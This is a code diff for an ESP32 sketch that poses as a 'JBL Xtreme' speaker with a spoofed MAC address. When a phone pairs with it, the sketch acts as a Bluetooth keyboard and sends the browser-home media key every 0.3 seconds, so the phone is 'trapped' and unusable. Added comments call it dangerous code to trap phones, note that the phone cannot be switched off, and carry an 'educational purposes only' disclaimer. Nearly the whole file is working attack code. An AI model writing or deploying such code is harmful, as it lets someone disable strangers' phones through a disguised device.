@@ -1,9 +1,28 @@
-#include <BleKeyboard.h>
+//               !!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!
+// !!!!!!! THIS IS FOR EDUCATIONAL PURPOSES ONLY !!!!!!!
+// !!!!!!! USE ONLY WITH PERMISSION !!!!!!!
+// !!!!!!! I AM NOT RESPONSIBLE FOR ANY DAMAGES OR OTHER BAD ACTIVITIES !!!!!!!
+// !!!!!!! DO NOT USE IT FOR ILLEGAL ACTIVITIES !!!!!!!
+// Hello, Iam Fattcat and this is Dangerous Bluetooth Code to get Mobile Cell Phones into "Trap".
 
+// Credits to Fattcat
+
+//                            ? How it works ?
+// -- Well, like this
+// ---- Device will be paired with THIS esp32 code then it locks with "KEY_MEDIA_WWW_HOME"
+// ---- Then it CAN NOT BE TURNED OFF by pressing Turn OFF Button on side of phone
+// ---- And I think also more DISABLED Types ...
+// ------------------------------------------------------------------------------------------------
+// -- ! CRITICAL BUGS (THAT MIGHT HAPPEN TO YOUR DEVICE !
+// ---- CAN NOT show opened apps (like ALT TAB on PC)
+// ---- On some Moble Phones MUST be restarted WHOLE PHONE (After Attacking) !
+// ------------------------------------------------------------------------------------------------
+
+#include <BleKeyboard.h>
 // BLE Keyboard
 BleKeyboard bleKeyboard("JBL Xtreme", "Custom Manufacturer", 100);
 
-// Set HERE YOUR MAC address
+//                              Set HERE YOUR MAC address
 const uint8_t customMacAddr[] = {0xF4, 0xF3, 0xAA, 0x07, 0xE4, 0xF2};
 
 void setup() {
@@ -26,17 +45,17 @@ void setup() {
 void loop() {
   // Check if is device connected (sometimes send message but isnt actually connected)
   if (bleKeyboard.isConnected()) {
-    Serial.println("BLE zariadenie pripojené!");
+    Serial.println("BLE Device connected!");
 
     // Send Medial button WWW_HOME
-    Serial.println("Odosielam tlačidlo: WWW_HOME");
+    Serial.println("Sending Button: WWW_HOME");
     bleKeyboard.write(KEY_MEDIA_WWW_HOME);
 
     // SEND KEYSTROKE EVERY 0.3 Seconds
     // Ensures now will be phone (or connected device TRAPPED and cannot use phone enymore) 
     delay(300);
   } else {
-    Serial.println("Čakám na pripojenie BLE zariadenia...");
+    Serial.println("Waiting for connection on BLE Device...");
   }
 
   delay(100);
